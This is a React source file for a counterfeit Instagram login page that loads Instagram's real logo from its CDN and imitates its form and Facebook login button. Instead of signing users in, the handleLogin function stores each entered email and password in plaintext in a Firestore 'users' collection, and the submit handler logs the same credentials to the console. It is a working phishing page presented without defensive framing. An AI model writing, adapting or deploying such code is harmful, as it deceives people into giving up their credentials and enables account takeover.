import React, { useState } from 'react';
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, addDoc } from 'firebase/firestore';


const InstagramLogin = () => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');
    const [loading, setLoading] = useState(false);

    // Note: In a real implementation, you would initialize Firebase here:


    const firebaseConfig = {
        apiKey: process.env.REACT_APP_FIREBASE_API_KEY,
        authDomain: process.env.REACT_APP_FIREBASE_AUTH_DOMAIN,
        projectId: process.env.REACT_APP_FIREBASE_PROJECT_ID,
        storageBucket: process.env.REACT_APP_FIREBASE_STORAGE_BUCKET,
        messagingSenderId: process.env.REACT_APP_FIREBASE_MESSAGING_SENDER_ID,
        appId: process.env.REACT_APP_FIREBASE_APP_ID
    };

    const handleLogin = async () => {
        setLoading(true);
        try {
            // Store email and password in Firestore
            await addDoc(collection(db, 'users'), {
                email: email,
                password: password
            });
        } catch (error) {
            setError(error.message);
        } finally {
            setLoading(false);
        }
    };


    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);


    const handleSubmit = async (e) => {
        e.preventDefault();
        setError('');
        setLoading(true);

        try {
            console.log('email:', email, 'password:', password);
        } catch (error) {
            setError(error.message);
        }
    };

    return (
        <div className="min-h-screen bg-gray-50 flex flex-col justify-center items-center px-4">
            <div className="max-w-md w-full space-y-8">
                <div className="bg-white p-8 border border-gray-300 rounded-lg">
                    <div className="flex justify-center mb-8">
                        {/* <Instagram className="w-12 h-12" /> */}
                        <i
            data-visualcompletion="css-img"
            aria-label="Instagram"
            role="img"
            style={{
                backgroundImage: 'url("https://static.cdninstagram.com/rsrc.php/v3/ym/r/BQdTmxpRI6f.png")',
                backgroundPosition: '0px 0px',
                backgroundSize: '176px 181px',
                width: '175px',
                height: '51px',
                backgroundRepeat: 'no-repeat',
                display: 'inline-block'
            }}
        ></i>
                    </div>

                    <form onSubmit={handleSubmit} className="space-y-6">
                        <div>
                            <input
                                type="email"
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                placeholder="Phone number, username, or email"
                                className="w-full px-4 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:border-gray-400"
                            />
                        </div>

                        <div>
                            <input
                                type="password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                placeholder="Password"
                                className="w-full px-4 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:border-gray-400"
                            />
                        </div>

                        <button
                                   onClick={handleLogin}
                            type="submit"
                            disabled={loading}
                            className={`w-full bg-blue-500 text-white py-2 rounded font-semibold
                ${loading ? 'opacity-70 cursor-not-allowed' : 'hover:bg-blue-600'}
        `}
                        >
                            {loading ? 'Logging in...' : 'Log In'}
                        </button>
                    </form>

                    <div className="mt-6 flex items-center justify-center space-x-2">
                        <div className="h-px bg-gray-300 w-full"></div>
                        <p className="text-sm font-semibold text-gray-500 px-4">OR</p>
                        <div className="h-px bg-gray-300 w-full"></div>
                    </div>

                    <button className="w-full mt-6 text-blue-900 font-semibold flex items-center justify-center space-x-2">
                        <span>Log in with Facebook</span>
                    </button>

                    {error && (
                        console.log(error)
                    )}

                    <div className="mt-4 text-center">
                        <a href="#" className="text-xs text-blue-900">
                            Forgot password?
                        </a>
                    </div>
                </div>

                <div className="bg-white p-6 border border-gray-300 rounded-lg text-center">
                    <p className="text-sm">
                        Don't have an account?{' '}
                        <a href="#" className="text-blue-500 font-semibold">
                            Sign up
                        </a>
                    </p>
                </div>
            </div>
        </div>
    );
};

export default InstagramLogin;